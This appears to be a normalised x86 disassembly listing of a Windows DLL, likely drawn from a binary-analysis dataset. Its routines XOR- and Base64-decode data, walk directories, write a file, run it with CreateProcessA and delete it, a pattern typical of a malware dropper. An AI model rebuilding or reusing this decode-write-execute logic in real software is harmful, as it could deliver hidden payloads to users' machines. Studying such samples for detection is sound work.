mov edi [ edx * 4 + rw-data ]
lea edx [ ecx + ecx ]
xor edx edi
shl edx 0xf
xor edx edi
xor edx ecx
lea ecx [ eax - 0x7 ]
and ecx 0xf
mov ecx [ ecx * 4 + rw-data ]
mov edi ecx
shr edi 0xb
xor ecx edi
mov edi edx
xor edi ecx
mov [ esi ] edi
mov esi edi
and esi 0xfed22169
shl esi 0x5
xor esi edi
shl ecx 0xa
dec eax
and eax 0xf
lea edi [ eax * 4 + rw-data ]
mov ebx [ edi ]
xor ecx edx
shl ecx 0x10
xor ecx ebx
shl ecx 0x2
xor ecx esi
mov [ rw-data ] eax
xor ecx edx
mov eax ecx
xor eax ebx
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
call sub_100035e3
sub_10003696
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
cmp edi esi
jne r-xdata
jbe r-xdata
mov eax esi
jmp r-xdata
call sub_1000360a
sub esi edi
xor edx edx
div esi
lea eax [ edi + edx ]
call sub_1000360a
sub edi esi
xor edx edx
div edi
lea eax [ esi + edx ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_100036cd
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
push esi
movsx esi [ ebp + 0x14 ]
push edi
movsx edi [ ebp + 0x10 ]
mov [ ebp + 0x8 ] eax
push esi
push edi
call sub_10003696
mov [ ebx ] al
pop ecx
inc ebx
dec [ ebp + 0x8 ]
pop ecx
jne r-xdata
pop edi
pop esi
sub_10003702
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
lea eax [ esi + 0x1 ]
push edi
push eax
call sub_10001f60
push [ ebp + 0x10 ]
mov edi eax
push [ ebp + 0xc ]
push esi
push edi
call sub_100036cd
add esp 0x14
mov eax edi
pop edi
pop esi
pop ebp
retn
sub_1000372b
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
push esi
mov esi [ ebx + 0x8 ]
test esi esi
je r-xdata
pop esi
push edi
xor edi edi
test esi esi
je r-xdata
pop edi
push edi
mov ecx ebx
call sub_10002f9f
push eax
call sub_100034c5
pop ecx
test al al
je r-xdata
inc edi
cmp edi esi
jb r-xdata
push edi
mov ecx ebx
call sub_10002f9f
push eax
call sub_100030a5
pop ecx
sub_10003771
push ebp
mov ebp esp
push ebx
push esi
push [ ebp + 0x8 ]
push 0x0
push 0x400
call sub_10001b14
mov esi eax
push esi
call sub_10003404
push esi
mov bl al
call sub_10001939
add esp 0x14
pop esi
mov al bl
pop ebx
pop ebp
retn
sub_1000379e
push ebp
mov ebp esp
sub esp 0xc
push esi
push 0xc
call sub_10001f60
push 0x5
mov [ ebp - 0x4 ] eax
call sub_10003478
mov esi eax
pop ecx
pop ecx
mov [ ebp - 0xc ] esi
test esi esi
je r-xdata
push [ ebp - 0xc ]
call sub_10001f78
mov eax [ ebp - 0x4 ]
pop ecx
pop esi
leave
retn
call sub_10002f8d
push ebx
mov [ ebp - 0x8 ] eax
push edi
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
add esi [ esi ]
mov eax [ ebp - 0x8 ]
cmp eax [ esi + 0x50 ]
jne r-xdata
pop edi
pop ebx
push 0x10
call sub_10004992
mov edi eax
movzx eax [ esi + 0x38 ]
add eax 0x2
push eax
call sub_10001f60
mov ebx eax
movzx eax [ esi + 0x38 ]
push eax
push [ esi + 0x3c ]
push ebx
call sub_1000428b
mov [ edi ] ebx
mov eax [ esi + 0x44 ]
mov [ edi + 0x4 ] eax
mov eax [ esi + 0x48 ]
push [ edi + 0x4 ]
mov [ edi + 0x8 ] eax
call sub_10003771
mov ecx [ ebp - 0x4 ]
add esp 0x18
test al al
setne al
push edi
mov [ edi + 0xc ] al
call sub_10002fb8
push 0x1
push 0x0
push [ esi + 0x3c ]
call sub_10002e94
add esp 0xc
cmp eax [ ebp + 0x8 ]
jne r-xdata
sub_10003859
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
push 0x5
call sub_10003478
mov esi eax
xor edi edi
pop ecx
mov [ ebp - 0x8 ] esi
cmp esi edi
je r-xdata
push [ ebp - 0x8 ]
call sub_10001f78
pop ecx
mov eax edi
pop edi
pop esi
leave
retn
call sub_10002f8d
mov [ ebp - 0x4 ] eax
cmp [ esi ] edi
jne r-xdata
cmp [ esi + 0x38 ] di
je r-xdata
add esi [ esi ]
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x50 ]
jne r-xdata
jmp r-xdata
push 0x1
push edi
push [ esi + 0x3c ]
call sub_10002e94
add esp 0xc
cmp eax [ ebp + 0x8 ]
je r-xdata
mov edi [ esi + 0x44 ]
sub_100038b6
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
push esi
push [ ebp + 0x8 ]
call sub_1000379e
and [ ebp - 0x4 ] 0x0
mov esi eax
mov eax [ esi + 0x8 ]
pop ecx
test eax eax
je r-xdata
mov ecx esi
call sub_10002f3b
push esi
call sub_10001f78
mov eax [ ebp - 0x8 ]
pop ecx
pop esi
leave
retn
push ebx
push edi
push ebx
mov ecx esi
call sub_10002f9f
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
test eax eax
jne r-xdata
inc ebx
cmp ebx [ esi + 0x8 ]
jb r-xdata
pop edi
pop ebx
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x8 ]
jb r-xdata
push ebx
mov ecx esi
call sub_10002f9f
cmp edi [ eax + 0x8 ]
je r-xdata
jmp r-xdata
push [ ebp - 0x4 ]
mov ecx esi
call sub_10002f9f
mov edi [ eax + 0x4 ]
xor ebx ebx
sub_1000392f
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi 0x250dfa8f
test edi edi
je r-xdata
push esi
call sub_100038b6
pop ecx
test eax eax
jne r-xdata
mov [ edi ] esi
pop edi
pop esi
pop ebp
retn
push esi
call sub_10003859
pop ecx
test eax eax
jne r-xdata
mov esi 0xbd3cc33a
test edi edi
je r-xdata
push esi
call sub_100038b6
pop ecx
test eax eax
jne r-xdata
mov [ edi ] esi
push esi
call sub_10003859
pop ecx
test eax eax
jne r-xdata
mov esi 0x7a38ebf3
test edi edi
je r-xdata
push esi
call sub_100038b6
pop ecx
test eax eax
jne r-xdata
mov [ edi ] esi
push esi
call sub_10003859
pop ecx
test eax eax
jne r-xdata
mov esi 0x4a36abf3
test edi edi
je r-xdata
push esi
call sub_100038b6
pop ecx
test eax eax
jne r-xdata
mov [ edi ] esi
push esi
call sub_10003859
pop ecx
test eax eax
jne r-xdata
mov esi 0x7712feae
test edi edi
je r-xdata
push esi
call sub_100038b6
pop ecx
test eax eax
jne r-xdata
mov [ edi ] esi
push esi
call sub_10003859
pop ecx
test eax eax
jne r-xdata
and [ edi ] eax
sub_100039ea
push ebp
mov ebp esp
sub esp 0x288
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
call sub_10002a96
cmp [ eax + edi - 0x1 ] 0x5c
pop ecx
mov esi r--data
je r-xdata
push edi
call sub_10002c9a
pop ecx
push esi
push r--data
push edi
call sub_10002cef
add esp 0xc
jmp r-xdata
push esi
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
call sub_10002cef
push 0x13c
mov edi eax
lea eax [ ebp - 0x144 ]
push ebx
push eax
mov [ ebp - 0x148 ] ebx
call sub_100042df
lea eax [ ebp - 0x148 ]
push eax
push edi
call sub_1000300a
cmp eax 0xffffffff
push edi
mov [ ebp - 0x8 ] eax
setne [ ebp + 0xb ]
call sub_10001f78
add esp 0x24
cmp [ ebp + 0xb ] bl
jmp r-xdata
push 0x13c
lea eax [ ebp - 0x284 ]
push ebx
push eax
mov [ ebp - 0x288 ] ebx
call sub_100042df
push esi
push r--data
push [ ebp - 0x4 ]
call sub_10002cef
mov edi eax
lea eax [ ebp - 0x288 ]
push eax
push edi
call sub_1000300a
push edi
mov [ ebp + 0x8 ] eax
call sub_10001f78
add esp 0x24
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
xor ebx ebx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x18 ] bl
je r-xdata
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
push 0xffffffff
jmp r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
push [ ebp - 0x8 ]
test [ ebp - 0x288 ] 0x10
je r-xdata
push 0xc
call sub_10001fff
pop ecx
cmp eax ebx
je r-xdata
call sub_1000302d
push [ ebp - 0x4 ]
call sub_10001f78
pop ecx
pop ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x18 ] bl
je r-xdata
push 0xc
call sub_10001fff
pop ecx
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x288 ]
push eax
push [ ebp + 0x8 ]
call sub_10003082
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x25c ]
push r--data
push eax
call sub_10002c53
pop ecx
pop ecx
test al al
jne r-xdata
mov [ ebp + 0x14 ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax ] r--data
mov [ ebp + 0x14 ] eax
jmp r-xdata
lea eax [ ebp - 0x11c ]
push r--data
push eax
call sub_10002c53
pop ecx
pop ecx
test al al
jne r-xdata
test [ ebp - 0x148 ] 0x10
jne r-xdata
mov [ ebp + 0x14 ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax ] r--data
mov [ ebp + 0x14 ] eax
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1000302d
pop ecx
lea eax [ ebp - 0x25c ]
push r--data
push eax
call sub_10002c53
pop ecx
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x148 ]
push eax
push [ ebp - 0x8 ]
call sub_10003082
pop ecx
pop ecx
test eax eax
lea eax [ ebp - 0x11c ]
push r--data
push eax
call sub_10002c53
pop ecx
pop ecx
test al al
jne r-xdata
push esi
push r--data
lea eax [ ebp - 0x25c ]
push eax
push [ ebp - 0x4 ]
call sub_10002cef
add esp 0x10
mov edi eax
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
test [ ebp - 0x148 ] eax
je r-xdata
test [ ebp + 0x10 ] 0x10
je r-xdata
push 0xc
call sub_10001fff
pop ecx
cmp eax ebx
je r-xdata
push esi
lea eax [ ebp - 0x11c ]
push eax
push [ ebp - 0x4 ]
call sub_10002cef
mov ecx [ ebp + 0x14 ]
add esp 0xc
mov edi eax
push edi
call sub_10002e0a
push edi
call sub_10001f78
pop ecx
push 0x1
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_100039ea
push edi
call sub_10001f78
add esp 0x18
push r--data
push [ ebp + 0xc ]
call sub_10002c53
pop ecx
pop ecx
test al al
je r-xdata
mov [ ebp + 0x14 ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax ] r--data
mov [ ebp + 0x14 ] eax
jmp r-xdata
mov ecx [ ebp + 0x14 ]
push edi
call sub_10002e0a
sub_10003c90
push ebp
mov ebp esp
sub esp 0xc
xor ecx ecx
mov [ ebp - 0xc ] ecx
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax ecx
leave
retn
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
inc ecx
mov [ ebp - 0xc ] ecx
cmp ecx [ ebp + 0x10 ]
jb r-xdata
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0xc ]
add ecx eax
mov dl [ ecx ]
mov al [ esi ]
and [ ebp - 0x8 ] 0x0
test al al
je r-xdata
pop esi
mov al [ ebp - 0xc ]
imul [ ebp - 0x8 ]
add al [ ebp - 0x1 ]
xor dl al
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov [ ecx ] dl
mov al [ eax + esi ]
mov [ ebp - 0x1 ] al
test al al
jne r-xdata
sub_10003cea
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push esi
mov esi [ CryptBinaryToStringA@IAT ]
push edi
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov eax [ rw-data ]
mov eax [ eax ]
mov edi [ GetLastError@IAT ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push r--data
push 0x1
push 0x1
mov ebx r--data
push ebx
call [ eax ]
push [ ebp - 0x4 ]
call sub_100049a9
pop ecx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
push 0x1
push [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
push [ ebp + 0x8 ]
call esi
mov eax [ rw-data ]
mov esi [ eax ]
call edi
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x2
push ebx
call [ esi ]
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_10003d7a
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ CryptStringToBinaryA@IAT ]
push edi
xor eax eax
push eax
push eax
push [ ebp + 0x10 ]
push eax
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov eax [ rw-data ]
mov eax [ eax ]
mov edi [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push r--data
push 0x1
push 0x3
mov ebx r--data
push ebx
call [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_100049a9
pop ecx
push 0x0
push 0x0
push [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
push eax
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov eax [ rw-data ]
mov esi [ eax ]
call edi
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x4
push ebx
call [ esi ]
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn 0xc
sub_10003e0c
push esi
push 0x4
mov esi ecx
call sub_10004992
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_100047fb
jmp r-xdata
xor eax eax
mov ecx eax
call sub_10003ce6
jmp r-xdata
push 0x4
mov [ esi + 0x8 ] eax
call sub_10004992
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_10003ce6
jmp r-xdata
push 0x1
mov [ esi ] eax
call sub_10004992
pop ecx
test eax eax
je r-xdata
mov [ esi + 0x4 ] eax
mov eax esi
pop esi
retn
sub_10003e60
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
push 0xffffffff
mov [ ebp - 0xc ] ecx
mov ecx [ ecx + 0x8 ]
push 0x1010101
call sub_10004807
mov esi [ GetLastError@IAT ]
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov ebx r--data
push ebx
push 0x1
push 0x1
mov edi r--data
push edi
call [ eax ]
mov eax [ ebp - 0x8 ]
xor eax 0xaa7d756
cmp [ ebp + 0x10 ] 0x0
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push eax
je r-xdata
call sub_100049a9
push [ ebp + 0xc ]
mov [ ebp + 0x10 ] eax
push [ ebp + 0x8 ]
push eax
call sub_1000428b
mov ecx [ ebp - 0x4 ]
add esp 0x10
mov eax [ ebp - 0xc ]
push [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
call sub_100041b0
movzx eax ax
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp + 0x10 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp + 0x10 ]
push ebx
push 0x1
push 0x2
push edi
call [ eax ]
mov eax [ ebp + 0xc ]
add eax 0x2
push eax
mov [ ebp - 0x4 ] eax
call sub_100049a9
push 0x2
lea ecx [ ebp - 0x10 ]
push ecx
push eax
mov [ ebp + 0x10 ] eax
call sub_1000428b
push [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
push [ ebp + 0x8 ]
add eax 0x2
push eax
call sub_1000428b
mov ecx [ ebp - 0x4 ]
add esp 0x1c
mov [ ebp - 0x4 ] ecx
jmp r-xdata
lea eax [ ecx + 0x4 ]
push eax
mov [ ebp + 0x8 ] eax
call sub_100049a9
push 0x4
lea ecx [ ebp - 0x8 ]
push ecx
push eax
mov [ ebp + 0xc ] eax
call sub_1000428b
push [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
add eax 0x4
push eax
call sub_1000428b
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
add esp 0x1c
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_10003cea
mov [ ebp + 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x3
push edi
call [ eax ]
push [ ebp + 0xc ]
call sub_100049d3
push [ ebp + 0x10 ]
call sub_100049d3
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
pop edi
pop esi
pop ebx
leave
retn 0xc
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
add eax edx
and edx 0x3
mov dl [ ebp + edx - 0x14 ]
xor [ eax ] dl
inc [ ebp + 0xc ]
cmp [ ebp + 0xc ] ecx
jb r-xdata
and [ ebp + 0xc ] 0x0
test ecx ecx
je r-xdata
sub_10003fe9
push ebp
mov ebp esp
sub esp 0x14
and [ ebp - 0xc ] 0x0
push ebx
push esi
push edi
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0xc ]
mov [ ebp - 0x14 ] ecx
push [ ebp + 0x8 ]
mov ecx [ ecx ]
call sub_10003d7a
mov edi [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov esi [ eax ]
call edi
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x4
mov ebx r--data
push ebx
call [ esi ]
and [ ebp - 0x8 ] 0x0
push 0x4
push [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
call sub_1000428b
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
xor eax 0xaa7d756
add esi 0xfffffffc
push esi
mov [ ebp + 0xc ] eax
call sub_100049a9
mov [ ebp + 0x8 ] eax
add esp 0x10
xor eax eax
test esi esi
je r-xdata
and [ ebp - 0x10 ] 0x0
push 0x2
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1000428b
mov eax [ ebp + 0x10 ]
add esi 0xfffffffe
mov [ eax ] esi
lea eax [ esi + 0x1 ]
push eax
call sub_100049a9
mov ecx [ ebp + 0x8 ]
push esi
add ecx 0x2
push ecx
push eax
mov [ ebp + 0x10 ] eax
call sub_1000428b
mov eax [ ebp - 0x14 ]
mov ecx [ eax + 0x4 ]
add esp 0x1c
push esi
push [ ebp + 0x10 ]
push [ ebp - 0x10 ]
call sub_100041fe
mov [ ebp + 0xf ] al
mov eax [ rw-data ]
mov esi [ eax ]
call edi
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x5
push ebx
call [ esi ]
cmp [ ebp + 0xf ] 0x0
pop edi
pop esi
pop ebx
jne r-xdata
mov edx [ ebp - 0x4 ]
mov ecx eax
and ecx 0x3
mov cl [ ebp + ecx + 0xc ]
xor cl [ edx + eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ eax + edx ] cl
inc eax
cmp eax esi
jb r-xdata
push [ ebp + 0x8 ]
call sub_100049d3
push [ ebp - 0x4 ]
call sub_100049d3
mov eax [ ebp + 0x10 ]
pop ecx
pop ecx
leave
retn 0xc
push [ ebp + 0x10 ]
call sub_100049d3
and [ ebp + 0x10 ] 0x0
pop ecx
sub_1000411b
push ebp
mov ebp esp
push ecx
push edi
mov edi [ ebp + 0xc ]
lea eax [ edi + 0x1 ]
push eax
call sub_100049a9
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
pop edi
leave
retn 0x8
push esi
xor esi esi
test edi edi
jle r-xdata
mov eax [ ebp - 0x4 ]
pop esi
mov edi [ ebp + 0x8 ]
sub edi eax
push ebx
mov eax [ ebp - 0x4 ]
lea ecx [ esi + eax ]
xor edx edx
push 0xb
mov eax esi
pop ebx
div ebx
mov al [ edx + r--data ]
xor al [ edi + ecx ]
inc esi
mov [ ecx ] al
cmp esi [ ebp + 0xc ]
jl r-xdata
pop ebx
sub_1000416b
push esi
mov esi ecx
push edi
mov edi [ esi + 0x8 ]
test edi edi
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov ecx edi
call sub_10004711
push edi
call sub_100049b2
pop ecx
mov esi [ esi + 0x4 ]
test esi esi
je r-xdata
mov ecx edi
call sub_10003ce9
push edi
call sub_100049b2
pop ecx
pop edi
pop esi
retn
mov ecx esi
call sub_10003ce9
push esi
call sub_100049b2
pop ecx
sub_100041b0
push ebp
mov ebp esp
push ecx
xor ecx ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0xc ] ecx
jbe r-xdata
mov ax [ ebp - 0x4 ]
leave
retn 0x8
push esi
shr [ ebp - 0x4 ] 0x1
mov edx 0x2042
xor dx [ ebp - 0x4 ]
shr dx 0x1
movzx edx dx
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov dl al
xor dl [ ebp - 0x4 ]
test dl 0x1
je r-xdata
inc ecx
cmp ecx [ ebp + 0xc ]
jb r-xdata
shr al 0x1
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov al [ ecx + eax ]
push 0x8
pop esi
pop esi
sub_10004217
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov dl [ ebp + 0xc ]
jmp r-xdata
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl dl
je r-xdata
pop ebp
retn
inc eax
xor eax eax
sub_10004235
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
cmp [ esi ] 0x0
mov [ ebp + 0x8 ] eax
je r-xdata
pop esi
pop ebp
retn
mov dl [ eax ]
push edi
test dl dl
je r-xdata
xor eax eax
sub eax esi
cmp [ ecx ] 0x0
je r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
inc [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov dl [ ecx ]
inc eax
test dl dl
jne r-xdata
movsx edi [ eax + ecx ]
movsx edx dl
sub edi edx
jne r-xdata
pop edi
mov ecx esi
test dl dl
je r-xdata
inc ecx
cmp [ eax + ecx ] 0x0
jne r-xdata
sub_1000428b
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
sub ecx eax
mov dl [ eax ]
dec [ ebp + 0x10 ]
mov [ ecx + eax ] dl
inc eax
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
sub_100042b0
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor eax eax
pop ebp
retn
movzx eax [ eax ]
movzx ecx [ ecx ]
sub eax ecx
pop ebp
retn
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
inc eax
inc ecx
jmp r-xdata
dec [ ebp + 0x10 ]
je r-xdata
sub_100042df
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn
movzx eax [ ebp + 0xc ]
imul eax eax 0x1010101
mov edx ecx
push ebx
push edi
mov edi [ ebp + 0x8 ]
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
pop edi
pop ebx
sub_1000430d
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi ] 0x0
je r-xdata
lea eax [ edi + 0x10 ]
push eax
call [ DeleteFileA@IAT ]
push edi
call sub_100049d3
pop ecx
xor eax eax
pop edi
pop ebp
retn 0x4
mov eax [ rw-data ]
push esi
mov esi [ eax ]
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x1
push r--data
call [ esi ]
push 0xffffffff
push [ edi ]
call [ WaitForSingleObject@IAT ]
pop esi
sub_10004361
push ebx
push esi
push 0xc
mov esi ecx
call sub_10004992
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
xor eax eax
mov ecx eax
call sub_10003e0c
jmp r-xdata
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0x10 ] bx
mov eax esi
pop esi
pop ebx
retn
sub_100043a4
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ExpandEnvironmentStringsA@IAT ]
push edi
push 0x0
push 0x0
push [ ebp + 0x8 ]
mov [ ebp - 0xc ] ecx
call esi
mov edi [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push r--data
push 0x1
push 0x2
mov ebx r--data
push ebx
call [ eax ]
push [ ebp - 0x4 ]
call sub_100049a9
pop ecx
push [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
push eax
push [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
call esi
mov eax [ rw-data ]
mov esi [ eax ]
call edi
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x3
push ebx
call [ esi ]
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_1000443c
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
push 0x0
push [ ecx + 0x8 ]
mov [ ebp - 0x8 ] ecx
call [ CreateDirectoryA@IAT ]
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ GetLastError@IAT ]
mov [ ebp - 0xc ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0xc ]
mov ebx r--data
push ebx
push 0x1
push 0x4
mov edi r--data
push edi
call [ eax ]
call esi
cmp eax 0x3
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
push 0x401
call sub_100049a9
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push [ eax + 0x4 ]
push [ eax + 0x8 ]
push r--data
push [ ebp - 0x4 ]
call [ wsprintfA@IAT ]
add esp 0x14
mov [ ebp - 0x18 ] eax
xor eax eax
push eax
push eax
push 0x2
push eax
push 0x2
push 0x40000000
push [ ebp - 0x4 ]
call [ CreateFileA@IAT ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0xc ]
push ebx
push 0x1
push 0x5
push edi
call [ eax ]
cmp [ ebp - 0x10 ] 0xffffffff
je r-xdata
push [ ebp - 0x4 ]
call sub_100049d3
pop ecx
and [ ebp - 0x1c ] 0x0
push 0x0
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x10 ]
call [ WriteFile@IAT ]
mov [ ebp + 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp + 0xc ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp + 0xc ]
push ebx
push 0x1
push 0x6
push edi
call [ eax ]
push [ ebp - 0x10 ]
call [ CloseHandle@IAT ]
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x44
call sub_10004992
push 0x10
mov [ ebp - 0xc ] eax
mov [ eax ] 0x44
mov [ eax + 0x2c ] 0x1
call sub_10004992
mov [ ebp + 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x10 ] 0x0
pop ecx
pop ecx
je r-xdata
cmp [ eax + 0xc ] 0x0
je r-xdata
push [ ebp + 0x8 ]
xor eax eax
push [ ebp - 0xc ]
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
call [ CreateProcessA@IAT ]
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp + 0xc ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp + 0xc ]
push ebx
push 0x1
push 0x7
push edi
call [ eax ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x11 ] 0x0
je r-xdata
push 0x401
call sub_100049a9
pop ecx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
push 0xc
push r--data
call sub_1000411b
mov [ ebp - 0x14 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp + 0xc ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp + 0xc ]
push ebx
push 0x1
push 0x8
push edi
call [ eax ]
mov eax [ ebp - 0x8 ]
push [ eax + 0xc ]
push [ ebp - 0x4 ]
push [ ebp - 0x14 ]
push r--data
push [ ebp - 0x10 ]
